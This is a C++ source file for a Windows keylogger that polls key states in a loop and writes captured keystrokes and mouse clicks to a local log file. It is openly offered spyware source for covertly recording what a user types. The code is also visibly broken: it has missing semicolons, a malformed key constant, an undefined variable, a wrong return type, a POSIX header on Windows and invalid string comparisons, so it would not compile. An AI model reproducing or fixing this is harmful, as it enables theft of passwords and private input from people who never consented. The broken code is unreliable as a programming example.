#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <sys/utsname.h>
#include <stdlib.h>
using namespace std;
class Keylogger{
public:
	void WriteToFile(string file_name){
		ofstream logkey; //Create object for file stream
		logkey.open(file_name,fstream::app);
		logkey << text; //Write text string to file
		logkey.close();
	}
bool CheckListKey(int key){
	string key;
switch(key){
	case VK_SPACE:
	cout << " ";//Space key log 
	this->WriteToFile(" ")
	break;
	case VK RETURN:
	cout << "\n";//Enter key log
	this->WriteToFile(" ")
	break;
	case VK_SHIFT:
	string shift = "<shiftkey>";
	cout << shift;//Shift key log
	this->WriteToFile(shift);
	case VK_BACK:
	cout << "\b";//Backspace key log
	WriteToFile("\b");
	break;
	case VK_RBUTTON:
	string rc = "<rclick>";
	cout<<rc;//Emulates backspace.
	WriteToFile(rc);
	break;
	case VK_LBUTTON:
	string lb = "<lbutton>";//Mouse Click.
	WriteToFile(lb);
	break;
default:
return false;
}
}
}
class OS{
public:
void OsInfo(){
	struct utsname osname;
	if(uname(&osname)) exit(-1);
	printf("Your PC's Operating system is %s@%s\n", osname.sysname, osname.release);
	if(osname.sysname != "Windows"){
		cout<<"This is a Windows-platform keylogger which uses a header <windows.h> that uses a Windows API."<<endl;
		cout<<"All the common macros used by Windows programmers, and all the data types \nused by the various functions and subsystems are included in this header."<<endl;
		Sleep(1);
		cout<<"Exiting..."<<endl;
		exit(1);
	}
	return 0;
}

}

int main(){
OS osys;
OS *system = &osys;
Keylogger keylog;
Keylogger *keys = &keylog;
system->osys;
char key;
string filename = "keylogs.txt";
while(TRUE){
	Sleep(10);
	for(key = 8; key<=190;key++){
		if(GetAsyncKeyState(key) == -32767){
			if(keys->CheckListKey(key) == FALSE){
				cout<<key;
				ofstream file;
				file.open(filename);
				file << key;
				file.close()
			}
		}
	}
}
return 0;
}
